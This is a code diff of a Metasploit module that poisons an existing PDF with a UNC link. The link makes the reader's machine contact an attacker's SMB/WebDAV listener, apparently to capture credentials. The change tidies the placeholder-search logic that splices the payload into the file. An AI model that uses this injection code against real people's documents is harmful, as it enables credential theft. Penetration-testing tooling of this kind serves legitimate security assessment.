@@ -35,7 +35,6 @@ class MetasploitModule < Msf::Auxiliary
         OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
         OptString.new("FILENAME", [ false, "Filename"]),
         OptPath.new("PDFINJECT", [ false, "Path and filename to existing PDF to inject UNC link code into"]),
-
       ])
   end
 
@@ -66,18 +65,13 @@ class MetasploitModule < Msf::Auxiliary
     content = File.read(datastore['PDFINJECT'])
 
     #Check for place holder - below ..should.. cover most scenarios.
-    if content.index("/Contents 2 0 R") != nil
-      #If place holder exists create new file content
-      newdata = content[0..(content.index('/Contents 2 0 R')+14)]+inject_payload+content[(content.index('/Contents 2 0 R')+15)..-1]
-    elsif content.index("/Contents 4 0 R") != nil
-      #If place holder exists create new file content
-      newdata = content[0..(content.index('/Contents 4 0 R')+14)]+inject_payload+content[(content.index('/Contents 4 0 R')+15)..-1]
-    elsif content.index("/Contents 6 0 R") != nil
-      #If place holder exists create new file content
-      newdata = content[0..(content.index('/Contents 6 0 R')+14)]+inject_payload+content[(content.index('/Contents 6 0 R')+15)..-1]
-    elsif content.index("/Contents 8 0 R") != nil
-      #If place holder exists create new file content
-      newdata = content[0..(content.index('/Contents 8 0 R')+14)]+inject_payload+content[(content.index('/Contents 8 0 R')+15)..-1]
+    newdata = ""
+    [2, 4, 6, 8].each do |pholder|
+      unless content.index("/Contents #{pholder} 0 R").nil?
+        #If place holder exists create new file content
+        newdata = content[0..(content.index("/Contents #{pholder} 0 R")+14)]+inject_payload+content[(content.index("/Contents #{pholder} 0 R")+15)..-1]
+        break
+      end
     end
 
     #Display error message if we couldn't poison the file
